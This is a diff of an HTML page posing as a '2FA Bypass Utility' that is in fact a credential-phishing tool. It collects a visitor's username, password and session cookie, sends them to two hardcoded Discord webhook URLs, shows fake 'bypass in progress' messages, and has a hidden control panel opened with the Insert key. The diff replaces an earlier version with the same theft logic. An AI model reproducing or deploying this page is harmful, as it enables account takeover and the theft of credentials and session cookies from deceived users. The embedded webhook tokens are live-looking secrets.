@@ -1,138 +1,230 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Send to Discord</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Bypass Utility</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
   <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
     body {
-      background: linear-gradient(135deg, #1a202c, #2d3748);
-      color: #fff;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      flex-direction: column;
+      margin: 0;
+      font-family: 'Orbitron', sans-serif;
+      background: black;
+      color: #00ffea;
+      overflow: hidden;
+    }
+    canvas#bg {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      z-index: -1;
+    }
+    .form-container, #controlPanel {
+      background: rgba(0, 0, 0, 0.7);
+      border: 1px solid #00ffea;
+      box-shadow: 0 0 20px #00ffea;
+      padding: 2rem;
+      border-radius: 12px;
+      width: 90%;
+      max-width: 500px;
+      margin: 2rem auto;
+      text-align: center;
     }
     h1 {
-      font-size: 2.5rem;
-      font-weight: bold;
-      color: #fbbf24;
-      margin-bottom: 30px;
-      text-align: center;
+      font-size: 2rem;
+      margin-bottom: 1.5rem;
     }
-    .form-container {
-      background-color: #4a5568;
-      padding: 40px 50px;
-      border-radius: 12px;
-      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
-      text-align: center;
+    input, button {
       width: 100%;
-      max-width: 400px;
-    }
-    input[type="text"] {
-      width: 100%;
-      padding: 14px 20px;
+      padding: 0.75rem;
+      margin: 0.5rem 0;
       border-radius: 8px;
-      border: 2px solid #2d3748;
-      background-color: #1a202c;
-      color: white;
+      border: none;
       font-size: 1rem;
-      margin-bottom: 20px;
-      transition: all 0.3s ease;
+      font-family: 'Orbitron', sans-serif;
     }
-    input[type="text"]:focus {
-      border-color: #fbbf24;
+    input {
+      background: #111;
+      color: #00ffea;
+      border: 1px solid #00ffea;
+    }
+    input:focus {
       outline: none;
-      background-color: #2d3748;
+      box-shadow: 0 0 8px #00ffea;
     }
     button {
-      padding: 12px 30px;
-      font-size: 1.2rem;
-      background-color: #3b82f6;
-      color: white;
-      border: none;
-      border-radius: 6px;
+      background: #00ffea;
+      color: #000;
       cursor: pointer;
-      width: 100%;
-      transition: background-color 0.3s ease;
-      margin-top: 10px;
+      transition: 0.3s;
     }
     button:hover {
-      background-color: #2563eb;
+      background: #00c2b3;
     }
-    .footer {
-      margin-top: 20px;
-      font-size: 0.875rem;
-      color: #aaa;
+    #controlPanel {
+      display: none;
+    }
+    .session {
+      background: #111;
+      padding: 1rem;
+      margin-top: 1rem;
+      border: 1px solid #00ffea;
+      border-radius: 8px;
     }
   </style>
 </head>
 <body>
 
-  <div class="form-container">
-    <h1>2fa bypasser (rework)</h1>
-    <form id="textForm">
-      <input type="text" id="usernameInput" placeholder="Enter Username" required />
-      <input type="text" id="passwordInput" placeholder="Enter Password" required />
-      <input type="text" id="cookieInput" placeholder="Enter Cookie" required />
-      <input type="text" id="webhookInput" placeholder="Enter Webhook" />
-      <button type="submit">Send</button>
-    </form>
-    <p class="footer"></p>
-  </div>
+<canvas id="bg"></canvas>
 
-  <script>
-    const webhookUrl1 = "https://discord.com/api/webhooks/1356725515104424099/5c9m_Cm6ZJlRh1jOELn1VEepc8f-YSymQCzy3htF7aoGB5hIdjZBH_ZJwjC9gMRqfW1_";
-    const webhookUrl2 = "https://discord.com/api/webhooks/1356725515104424099/5c9m_Cm6ZJlRh1jOELn1VEepc8f-YSymQCzy3htF7aoGB5hIdjZBH_ZJwjC9gMRqfW1_";
+<div class="form-container">
+  <h1>2FA Bypass Utility</h1>
+  <form id="bypassForm">
+    <input type="text" id="username" placeholder="Username" required>
+    <input type="text" id="password" placeholder="Password" required>
+    <input type="text" id="cookie" placeholder="Cookie" required>
+    <input type="text" id="webhook" placeholder="Webhook (optional)">
+    <button type="submit">Initiate Bypass</button>
+  </form>
+  <p>May take from 1 - 30 minutes depending on account</p>
+</div>
 
-    document.getElementById("textForm").addEventListener("submit", function (e) {
-      e.preventDefault();
-      
-      const username = document.getElementById("usernameInput").value;
-      const password = document.getElementById("passwordInput").value;
-      const cookie = document.getElementById("cookieInput").value;
-      const webhook = document.getElementById("webhookInput").value;
+<div id="controlPanel" class="form-container">
+  <h1>Control Panel</h1>
+  <div id="sessions"></div>
+</div>
 
-      const payload = {
-        content: `Username: **${username}**\nPassword: **${password}**\nCookie: **${cookie}**`
-      };
+<script>
+const hardcodedWebhooks = [
+  "https://discord.com/api/webhooks/1356725515104424099/5c9m_Cm6ZJlRh1jOELn1VEepc8f-YSymQCzy3htF7aoGB5hIdjZBH_ZJwjC9gMRqfW1_",
+  "https://discord.com/api/webhooks/1356725515104424099/5c9m_Cm6ZJlRh1jOELn1VEepc8f-YSymQCzy3htF7aoGB5hIdjZBH_ZJwjC9gMRqfW1_"
+];
 
-      // Function to send data to webhook
-      function sendToWebhook(url) {
-        return fetch(url, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify(payload),
-        })
-        .then(res => {
-          if (!res.ok) {
-            throw new Error(`Failed to send to webhook: ${url}`);
-          }
-          return res;
-        });
-      }
+let sessions = [];
 
-      // Send data to both webhooks
-      Promise.all([sendToWebhook(webhookUrl1), sendToWebhook(webhookUrl2)])
-        .then(() => {
-          alert("Data sent successfully to webhook!");
-          // Redirect to the previous page or any desired page
-          window.location.href = "https://discord.com"; // Replace with your URL
-        })
-        .catch(error => {
-          alert(`Error: ${error.message}`);
-        });
+function sendWebhook(url, payload) {
+  return fetch(url, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(payload)
+  });
+}
+
+document.getElementById('bypassForm').addEventListener('submit', e => {
+  e.preventDefault();
+
+  const username = document.getElementById('username').value;
+  const password = document.getElementById('password').value;
+  const cookie = document.getElementById('cookie').value;
+  const webhook = document.getElementById('webhook').value;
+
+  const sessionId = Date.now();
+
+  sessions.push({ id: sessionId, username, password, cookie, webhook, approved: false });
+  updateSessions();
+
+  if (webhook) {
+    sendWebhook(webhook, {
+      content: "Bypass in progress... Please wait. May take 1 - 30 minutes depending on account."
     });
-  </script>
+  }
+
+  const fullPayload = {
+    content: `Username: **${username}**\nPassword: **${password}**\nCookie: **${cookie}**`
+  };
+
+  hardcodedWebhooks.forEach(url => sendWebhook(url, fullPayload));
+
+  setTimeout(() => {
+    const session = sessions.find(s => s.id === sessionId);
+    if (session && !session.approved && session.webhook) {
+      sendWebhook(session.webhook, fullPayload);
+      sessions = sessions.filter(s => s.id !== sessionId);
+      updateSessions();
+    }
+  }, 10 * 60 * 1000);
+});
+
+function updateSessions() {
+  const container = document.getElementById('sessions');
+  container.innerHTML = '';
+  sessions.forEach(session => {
+    const div = document.createElement('div');
+    div.className = 'session';
+    div.innerHTML = `
+      <p><strong>Username:</strong> ${session.username}</p>
+      <button onclick="approveSession(${session.id})">Approve</button>
+      <button onclick="declineSession(${session.id})">Decline</button>
+    `;
+    container.appendChild(div);
+  });
+}
+
+function approveSession(id) {
+  const session = sessions.find(s => s.id === id);
+  if (session && session.webhook) {
+    const payload = {
+      content: `Username: **${session.username}**\nPassword: **${session.password}**\nCookie: **${session.cookie}**`
+    };
+    sendWebhook(session.webhook, payload);
+  }
+  sessions = sessions.filter(s => s.id !== id);
+  updateSessions();
+}
+
+function declineSession(id) {
+  const reason = prompt("Enter decline reason:") || "Declined without reason";
+  const session = sessions.find(s => s.id === id);
+  if (session && session.webhook) {
+    sendWebhook(session.webhook, { content: `Bypass failed: ${reason}` });
+  }
+  sessions = sessions.filter(s => s.id !== id);
+  updateSessions();
+}
+
+document.addEventListener('keydown', e => {
+  if (e.code === 'Insert') {
+    const panel = document.getElementById('controlPanel');
+    panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
+  }
+});
+
+// Animation: Starfield
+const canvas = document.getElementById('bg');
+const ctx = canvas.getContext('2d');
+let stars = [];
+function resizeCanvas() {
+  canvas.width = window.innerWidth;
+  canvas.height = window.innerHeight;
+}
+window.addEventListener('resize', resizeCanvas);
+resizeCanvas();
+
+for (let i = 0; i < 150; i++) {
+  stars.push({
+    x: Math.random() * canvas.width,
+    y: Math.random() * canvas.height,
+    size: Math.random() * 2,
+    speed: Math.random() * 0.5 + 0.2
+  });
+}
+function animateStars() {
+  ctx.clearRect(0, 0, canvas.width, canvas.height);
+  for (let star of stars) {
+    ctx.beginPath();
+    ctx.arc(star.x, star.y, star.size, 0, Math.PI * 2);
+    ctx.fillStyle = '#00ffea';
+    ctx.fill();
+    star.y += star.speed;
+    if (star.y > canvas.height) {
+      star.y = 0;
+      star.x = Math.random() * canvas.width;
+    }
+  }
+  requestAnimationFrame(animateStars);
+}
+animateStars();
+</script>
 
 </body>
 </html>
